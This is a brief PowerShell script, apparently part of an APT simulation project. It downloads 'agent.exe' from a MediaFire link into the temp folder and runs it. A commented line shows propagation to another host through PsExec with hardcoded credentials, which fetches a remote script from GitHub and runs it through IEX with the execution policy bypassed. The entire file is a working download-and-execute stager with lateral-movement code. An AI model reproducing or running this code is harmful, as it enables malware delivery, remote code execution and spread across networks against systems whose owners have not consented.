#Download the Agent 

$url = "http://download1698.mediafire.com/qycco2btzkzg/t4c3gs908blwyq7/agent.exe"

#$output = "C:\Users\User\Downloads\Agent.exe"
$output = "$env:temp\agent.exe"

$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)

#Execute the Agent
#while (!(Test-Path "C:\Users\User\Downloads\Agent.exe")) {start-Sleep 1 }
#[System.Diagnostics.Process]::Start("C:\Users\User\Downloads\Agent.exe")

while (!(Test-Path $output)) {start-Sleep 1 }
[System.Diagnostics.Process]::Start($output)

#Propagate agent withe PsExec 
#PsExec.exe \\10.0.0.30  -u user -p password Powershell.exe -ep bypass -c IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Sir4h/APT_Project/master/PowerShell_Scripts/getagent.ps1'))
